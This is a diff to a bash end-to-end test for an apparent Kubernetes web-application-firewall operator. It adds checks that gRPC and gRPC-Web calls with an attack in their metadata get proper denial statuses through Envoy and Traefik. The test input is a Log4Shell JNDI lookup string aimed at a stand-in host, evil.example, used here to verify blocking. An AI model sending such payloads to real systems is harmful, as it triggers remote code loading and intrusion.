@@ -9,8 +9,8 @@
 # Envoy pods, attacks are blocked through both proxies, a body attack is
 # held back with its headers, one followed by HTTP/2 trailers is inspected
 # too, gRPC calls pass in block mode but not one with an attack in its
-# metadata (#284), and unprotecting or uninstalling leaves the
-# user's objects as they were. Needs the operator installed (make
+# metadata (#284), which gets a gRPC status (#275), and unprotecting or
+# uninstalling leaves the user's objects as they were. Needs the operator installed (make
 # kind-operator); ends with helm uninstall. KEEP=1 leaves the test's objects.
 set -euo pipefail
 
@@ -345,8 +345,7 @@ h2_are() {
 }
 # grpc_are CODE [KEY=VALUE...]: a gRPC call (grpc.health.v1.Health/Check)
 # with that metadata ends with that status code, through both Gateways and
-# Traefik. A denial is an HTTP 403, which gRPC clients read as
-# PermissionDenied.
+# Traefik.
 grpc_are() {
   local want=$1 md=() port
   shift
@@ -354,6 +353,32 @@ grpc_are() {
   for port in "$CUSTOM_PORT" "$PLAIN_PORT" "$TRAEFIK_PORT"; do
     [[ $("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port") == "$want" ]] || return 1
   done
+}
+# grpc_denied_by_engine [KEY=VALUE...]: ... is PermissionDenied with the
+# engine's grpc-message, which names the request ID, not one the client
+# made up from an HTTP 403 ("unexpected HTTP status code ...") (#275).
+grpc_denied_by_engine() {
+  local md=() port out
+  for kv in "$@"; do md+=(-metadata "$kv"); done
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT" "$TRAEFIK_PORT"; do
+    out=$("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port" 2>&1) || return 1
+    [[ $out == *"grpchealth: Forbidden (request ID "*")"*PermissionDenied ]] || return 1
+  done
+}
+# grpc_web_status PORT: the HTTP status and grpc-status of a gRPC-Web call
+# (curl, HTTP/1.1) with an attack in its metadata, as "HTTP GRPC".
+grpc_web_status() {
+  curl -s -o /dev/null -D - -H "Host: $HOST" -H 'Content-Type: application/grpc-web+proto' -H 'X-Grpc-Web: 1' \
+    -H 'X-Api-Key: ${jndi:ldap://evil.example/a}' --data-binary "@$work/grpc-empty" \
+    "http://127.0.0.1:$1/grpc.health.v1.Health/Check" |
+    tr -d '\r' | awk 'NR == 1 { code = $2 } tolower($1) == "grpc-status:" { grpc = $2 } END { print code, grpc }' || true
+}
+# A gRPC-Web denial is trailers-only: HTTP 200 and grpc-status 7 through
+# Envoy, as the gRPC-Web spec says; HTTP 403 through Traefik, whose
+# ForwardAuth denies only on a non-2xx answer.
+grpc_web_denied() {
+  [[ $(grpc_web_status "$CUSTOM_PORT") == "200 7" && $(grpc_web_status "$PLAIN_PORT") == "200 7" &&
+    $(grpc_web_status "$TRAEFIK_PORT") == "403 7" ]]
 }
 # Log4Shell (944150), quoted: not a shell expansion.
 GRPC_ATTACK='x-api-key=${jndi:ldap://evil.example/a}'
@@ -374,6 +399,7 @@ no_wiring() {
 
 go build -o "$work/h2trailers" ./hack/h2trailers
 go build -o "$work/grpchealth" ./hack/grpchealth
+printf '\0\0\0\0\0' >"$work/grpc-empty" # one empty gRPC message
 for gw in custom plain; do
   eventually "Envoy Gateway runs Gateway $gw" envoy_pods "$gw"
 done
@@ -433,6 +459,8 @@ check "a benign body with trailers (HTTP/2) passes" h2_are 200 / "q=hello"
 # on the binary body).
 check "a gRPC call passes" grpc_are OK
 check "a gRPC call with an attack in its metadata is denied" grpc_are PermissionDenied "$GRPC_ATTACK"
+check "and its client gets the engine's gRPC status, not an HTTP 403" grpc_denied_by_engine "$GRPC_ATTACK"
+check "a gRPC-Web call with an attack in its metadata gets grpc-status 7" grpc_web_denied
 
 echo "== detect mode"
 policy Detect
